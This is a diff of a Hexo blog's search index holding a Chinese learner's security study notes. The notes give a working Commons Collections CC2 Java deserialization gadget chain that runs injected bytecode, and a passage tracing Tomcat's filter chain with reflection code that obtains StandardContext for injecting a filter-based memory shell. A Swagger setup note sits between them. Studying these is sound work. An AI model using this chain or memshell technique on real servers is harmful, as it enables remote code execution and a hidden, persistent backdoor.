@@ -884,8 +884,9 @@
     <title>cSharp跨线程访问</title>
     <url>/2021/12/27/cSharp%E8%B7%A8%E7%BA%BF%E7%A8%8B%E8%AE%BF%E9%97%AE/</url>
     <content><![CDATA[<p>在c#中往往会报出这样的异常”调用线程无法访问此对象,因为另一个线程拥有它”,如果允许了这种情况,则可能会出现两个线程抢一块资源的情况,可能会出现<strong>死锁</strong>的情况</p>
-<p><img src="/images/cSharp%E8%B7%A8%E7%BA%BF%E7%A8%8B%E8%AE%BF%E9%97%AE/image-20211227162712864.png" alt="image-20211227162712864"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20211227162712864.png" alt="image-20211227162712864"></p>
 <h5 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h5><p>可以通过一种<strong>委托代理</strong>的思路来解决,类似的思路还出现在Runnable接口调用start方法    <a href="/2021/12/23/java%E5%A4%9A%E7%BA%BF%E7%A8%8B">路标</a></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220408202050516.png" alt="image-20220408202050516"></p>
 ]]></content>
       <categories>
         <category>c#</category>
@@ -4059,7 +4060,7 @@
 <p>总结</p>
 </blockquote>
 <p>在学习过程中,对于java的反射,代理,接口,等等基础知识有了更深刻的理解,尤其是在抽象类的部分,也感受到了什么叫”基础不牢,地动山摇”,后序还有几条链没有复现,现在虽然都跟着做了一遍,但也仅仅是做了一遍,要是自己找反序列化链的话,估计没戏,所以接下来自己跟着思维导图,将每一种可能都模仿一层层找的方式复现一遍</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/CC.jpg" alt="CC"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220401003902537.png" alt="image-20220401003902537"></p>
 <h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><p>特点是没有用到Transformer数组</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">		<span class="comment">//一样是防止add直接执行代码,也可以将newTransformer方法改为toString实现同样效果</span></span><br><span class="line">        Class&lt;? extends TransformingComparator&gt; transformingComparatorClass = transformingComparator.getClass();</span><br><span class="line">        Field transformer = transformingComparatorClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        SerializeTest.serialize(priorityQueue);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
@@ -4766,6 +4767,118 @@
       <tags>
         <tag>java</tag>
         <tag>commons-collections</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>swagger学习</title>
+    <url>/2022/04/01/swagger%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>在项目中使用swagger需要springfox</p>
+<ul>
+<li><p>swagger2</p>
+</li>
+<li><p>ui</p>
+</li>
+</ul>
+<p>SpringBoot导入swagger依赖</p>
+<p>2.5.7springboot—–2.9.2 swagger无报错</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger2 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Swagger配置扫描接口</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>filter内存马学习</title>
+    <url>/2022/04/17/filter%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h5 id="调试前的准备"><a href="#调试前的准备" class="headerlink" title="调试前的准备"></a>调试前的准备</h5><p>首先配置环境和调试用的代码</p>
+<p>新建java-web maven项目,在pom.xml中导入对应依赖</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Servlet 依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSP依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接着在filter处打断点,debug,但是出现了无法在此处step into的问题,和之前一样,去下载tomcat的源码给sourcepath中添加tomcat源码目录,调试的时候能正常进入,但是有很多报红,并不影响代码跟进调试,之后再解决这个问题</p>
+<p>好吧,我是儍狗,原来maven可以直接导入tomcat依赖然后下载源码……</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>接下来跟进到代码,跟进filter的代码流程</p>
+</blockquote>
+<p>首先进入doFilter方法中,会直接进入<code>internalDoFilter()</code>方法中,这个才是Tomcat中真正实现过滤的类</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417184815764.png" alt="image-20220417184815764"></p>
+<p>当到最后一个Filter,就会调用对应servlet的service方法</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220417185013757.png" alt="image-20220417185013757"></p>
+<p>总而言之,所有Filter就是一条独木桥上面的木板,少了哪一块都会导致后面的Filter的doFilter方法调用不到从而导致调用不到对应Servlet的service方法</p>
+<p>在tomcat的组成中,一部分为服务器用于与外界交流,一部分是容器,里面运行的就是servlet,filter….</p>
+<h5 id="tomcat和servlet的关系"><a href="#tomcat和servlet的关系" class="headerlink" title="tomcat和servlet的关系"></a>tomcat和servlet的关系</h5><p>Tomcat将http请求文本接收并解析,然后封装成HttpServletResquest类型的request对象,</p>
+<p>servlet将要响应的信息封装成HttpServletResponse对象给tomcat,tomcat就会将其编程响应文本的格式发送给浏览器</p>
+<h4 id="容器组件Container"><a href="#容器组件Container" class="headerlink" title="容器组件Container"></a>容器组件Container</h4><p> 容器代表一类组件，这类组件的作用就是接收客户端请求并返回响应数据，具体操作委派到子组件完成。</p>
+<p>​    Engine、Host、Context、Wrapper均继承自Container</p>
+<p>Tomcat中的Container用于封装和管理Servlet,以及具体处理Request请求,在Container中包含了四个子容器</p>
+<h5 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h5><p>​        最顶层容器组件,其下可以包含多个Host</p>
+<p>实现类为<code>org.apache.catalina.core.StandardEngine</code></p>
+<h5 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h5><pre><code>     为了提供对多个域名的服务，我们可以将每个域名视为一个虚拟的主机。在每个Host下包含多个Context
+</code></pre>
+<p>实现类为<code>org.apache.catalina.core.StandardHost</code></p>
+<h5 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h5><p>​        一个Context代表一个Web应用,其下可以包含多个Wrapper</p>
+<p>实现类为<code>org.apache.catalina.core.StandardContext</code></p>
+<h5 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h5><p>​        一个Wrapper代表一个Servlet</p>
+<p>实现类为<code>org.apache.catalina.core.StandardWrapper</code></p>
+<p>总而言之,Host是主机,Context是web应用,wrapper是servlet</p>
+<h5 id="一些会用到的类"><a href="#一些会用到的类" class="headerlink" title="一些会用到的类"></a>一些会用到的类</h5><p>FilterDefs:</p>
+<p>存放FilterDef的数组,,FilterDef中存放这过滤器名,过滤器实例,作用url等基本信息,(调试的时候没找到作用url的成员变量)</p>
+<p>FilterConfigs:存放FilterConfig的数组,FilterConfig主要存放FilterDef和Filter对象等信息</p>
+<p>FilterMaps:存放FilterMap数组,在FilterMap中主要存放了FilterName和对应的URLPattern    </p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418151626862.png" alt="image-20220418151626862" style="zoom:50%;" />
+
+<p>FilterChain: 过滤器链,该对象上的doFilter方法能依次调用链上的Filter</p>
+<p>StandardContext: Context接口的标准实现类,一个Context代表一个Web应用,其下可以包含多个Wrapper(servlet)</p>
+<p>StandardWrapperValue: 一个Wrapper的标准实现类,一个Wrapper代表一个Servlet</p>
+<p>在StandardWrapperValue中会利用ApplicationFilterFactory来创建filterChain</p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418152549816.png" alt="image-20220418152549816" style="zoom:67%;" />
+
+<p>在<code>ApplicationFilterFactory</code>中的createFilterChain方法中,首先通过getParent获取当前wrapper的爹,也就是Context,然后获取到当前context中的所有filterMap,我自己写的是testFilter1和testFilter2两个</p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153140872.png" alt="image-20220418153140872" style="zoom:80%;" />
+
+<p>接下来</p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418153636868.png" alt="image-20220418153636868" style="zoom:80%;" />
+
+<p>会对FilterMap进行遍历,如果当前请求中的url与遍历中的filterMap相对应,则把filterMap对应的FilterConfig添加到filterChain中去</p>
+<p>添加完成后会调用doFilter方法</p>
+<p>doFilter方法会调用internalDoFilter方法,该方法会依次从filters中取出filterConfig,调用filter的doFilter方法,从而调用到过滤器中重写的doFilter方法,触发自定义的代码</p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418154301503.png" alt="image-20220418154301503" style="zoom:80%;" />
+
+
+
+<h4 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h4><p>要想实现动态添加filter,首先要获取到context,因为根据前面的分析,filterMaps是通过context获取到的</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418155818702.png" alt="image-20220418155818702"></p>
+<p>按照大佬的方法,首先web容器启动的时候会为每个web应用创建一个ServletContext对象,代表当前应用,而有一个类很特殊,就是<code>ApplicationContext</code>类,它是ServletContext的实现类,并且它的成员变量中包含了<code>context</code>的标准实现类<code>StandardContext</code></p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220418160009434.png" alt="image-20220418160009434" style="zoom:67%;" />
+
+<p>可以通过反射来获取到它的这个成员变量,即为当前的context,然后就可以添加filterMaps,进行一系列操作了</p>
+<p>获取到context后,就可以进行动态注入filter了,但是注入之前要明确注入的参数,注入内存马实际上是在模拟写xml文件的过程</p>
+<p>filterDefs存放了filter的定义,对应的类和名称就相当于web.xml中这部分代码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.test.filter.testFilter1<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>filterMaps存放了filter的路径和对应filter的对应关系,还暗含了filter的调用顺序,相当于这部分代码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>FilterConfigs</p>
+<p>存放了FilterConfig数组,在FilterConfig中主要存放FilterDef和Filter对象的信息,调用的时候就是从这里面获取的filter</p>
+<p>这里不得不提到一点,就是getClass方法其实得到的是当前正在运行的对象对应的类</p>
+<p>ServletContext接口当前正在运行的对象所对应的类就是ApplicationContextFacade</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220418232736182.png" alt="image-20220418232736182"></p>
+<p>而这个类中的Context的类型是ApplicationContext</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220418233017639.png" alt="image-20220418233017639"></p>
+<p>ApplicationContext中有StandardContext类型的变量context,通过这样就能获取到对应的context</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line"><span class="comment">//这里获取到的class是ApplicationContextFacade</span></span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// ApplicationContext 为 ServletContext 的实现类</span></span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// standardContext为context接口标准实现类</span></span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
+
+<p>获取当前context的方法还有好几种,完事再补学一手</p>
+<h4 id="添加filter到当前context"><a href="#添加filter到当前context" class="headerlink" title="添加filter到当前context"></a>添加filter到当前context</h4>]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>memshell</tag>
       </tags>
   </entry>
 </search>
